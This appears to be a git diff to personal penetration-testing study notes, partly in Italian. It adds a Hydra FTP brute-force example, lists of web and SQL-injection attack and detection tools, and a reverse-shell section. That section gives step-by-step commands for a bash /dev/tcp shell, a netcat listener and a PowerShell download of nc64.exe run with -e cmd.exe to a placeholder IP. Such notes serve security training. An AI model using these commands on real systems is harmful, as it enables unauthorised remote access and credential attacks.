@@ -412,6 +412,7 @@ per usare la shell da python
 > os.setuid(0)  // se il binario di python ha il setuid abilitato si fa privex così
 > os.system("shell commands")
 
+
 <br>
 <br>
 
@@ -500,10 +501,16 @@ Cracks hashes with rainbow tables attacks, using time-memory trade-off algorithm
 
 >  http://project-rainbowcrack.com 
 
+## THC-Hydra
+
+public tool on Github. parallelized login cracker that can attack numerous protocols. 
+
+command line tool. Example:
+> hydra -L /root/Wordlists/Usernames.txt -P /root/Wordlists/Passwords.txt ftp://10.10.10.10
+
 ## Altri Tools
 
 - hashcat:  https://hashcat.net
-- THC-Hydra: free to use on github
 - Medusa: http://foofus.net
 - pwdump
 - Elcomsoft
@@ -819,4 +826,161 @@ Per riconoscere l'attacco con Wireshark, basta tenere d'occhio se compare un ele
 - IBM Security Network Intrusion Prevention System: https://www.ibm.com 
 
 
+<br>
+<br>
 
+-----
+
+<br>
+<br>
+
+# Web Server and Application 
+
+## Web Server
+
+### Metasploit
+
+> https://www.metasploit.com
+
+Exploit development platform that supports fully automated exploitation of web servers, by abusing known vulnerabilities and leveraging weak passwords
+
+### Other tools for Web Server Attacks
+
+- Immunity's CANVAS: https://www.immunityinc.com
+- THC Hydra: su github
+- HULK DoS: su github
+- MPack: su sourceforge
+- w3af: https://w3af.org
+
+## Web server Security Tools
+
+- Fortify WebInspect: https://www.microfocus.com  
+- Acunetix Web Vulnerability Scanner: https://www.acunetix.com
+- Retina Host Security Scanner: https://www.beyondtrust.com
+- NetIQ Secure Configuration Manager: https://www.netiq.com
+- SAINT Security Suite: https://www.carson-saint.com
+- Sophos Intercept X for Server: https://www.sophos.com
+
+
+
+## Web Application
+
+OWASP TOP 10 for most important vulnerabilities.
+
+### Exploit Sites
+- Exploit Database: https://www.exploit-db.com
+- SecurityFocus: https://www.securityfocus.com
+
+### Burp Suite
+
+> https://portswigger.net
+
+Integrated platform for performing security testing of web applications. It has various tools that work together to support the entire testing process, from the initial mapping and analisys to the exploit of security weaknesses.
+
+Some built-in tools are:
+- **INtercepting proxy** for inspecting and
+- **Application-aware spider** for crawling content and functionality
+- **Web application scanner** for automating the detection of numerous types of vulnerabilities
+- **intruder tool** for performing customized attacks to find and exploit unusual vulns
+- **repeater tool** for manipulating and resending individual requests
+- **sequencer tool** for testing the randomness of session tokens
+
+### OWASP Zed Attack Proxy (ZAP)
+
+> https://www.owasp.org
+
+OWASP Zed Attack Proxy (ZAP) is an integrated penetration testing tool for finding vulnerabilities in web applications. It offers automated scanners as well as a set of tools that allow you to find security vulnerabilities manually. Attackers use OWASP ZAP for web spidering/crawling to identify hidden content and functionality in the target web application.
+
+### Other Web Application attack tools:
+- Metasploit: https://www.metasploit.com 
+- w3af: http://w3af.org
+- Nikto: https://cirt.net 
+- Sn1per: su github 
+- WSSiP: su github
+
+### Web App testing Tools
+- N-Stalker Web App Security Scanner: https://www.nstalker.com
+- Acunetix WVS: https://www.acunetix.com 
+- Browser Exploitation Framework (BeEF): http://beefproject.com
+- Metasploit: https://www.metasploit.com 
+- PowerSploit: su Github
+- Watcher: https://www.casaba.com
+ 
+
+## SQL Injection Tools
+
+### SQLMAP
+
+> http://sqlmap.org 
+
+Open-Source Penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and the taking over of a database.
+
+### Others SQL Injection Tools
+
+- Mole: su sourceforge
+- Blisqy: su github
+- blind-sql-bitshifting: su github
+- NoSQLMap: su github
+- SQL Power Injection: https://sqlpowerinjector.com
+
+### SQL Injection Detection Tools
+
+- Damn Small SQLi Scanner (DSSS): su Github
+- OWASP ZAP: https://www.owasp.org
+- Snort: https://www.snort.org
+- Burp Suite: https://portswigger.com
+- HCL AppScan: https://www.hcltech.com 
+- w3af:  https://w3af.org
+
+<br>
+<br>
+
+-----
+
+<br>
+<br>
+
+# REVERSE SHELL
+
+## bersaglio Linux
+
+su kali si hanno delle webshell standard nella cartella 
+> /usr/share/webshells
+
+la procedura è sempre la stessa:
+1. scrivere uno script bash:
+
+shell.sh:
+> #!/bin/bash
+> bash -i >& /dev/tcp/[IP TARGET]/[PORTA] 0>& 1
+
+2. aprire una porta usando netcat:
+
+> nc -nvlp [PORTA]
+
+3. apri in ascolto python http server (stessa cartella dello shell.sh):
+
+> python3 -m http.server [PORTA]
+
+4. eseguire http://[IP]:[PORTA]/shell.sh da remoto per eseguire lo script.sh sul terminale remoto
+5. usare shell dal listener nc che era aperto prima
+
+
+## bersaglio WINDOWS
+
+1. scaricare il file nc64.exe
+2. aprire porta netcat in ascolto:
+
+> nc -nvlp [PORTA]
+
+3. aprire in ascolto python http server dalla cartella in cui si è scaricato nc64.exe:
+
+> python3 -m http.server [PORTA]
+
+4. inserire il file nc64.exe sulla macchina remota:
+
+> powershell -c wget http://[IP]:[PORTA]/nc64.exe -outfile nc64.exe
+
+5. connettere cmd.exe alla nostra macchina tramite netcat:
+
+> powershell -c .\nc64.exe -e cmd.exe [IP] [PORTA]
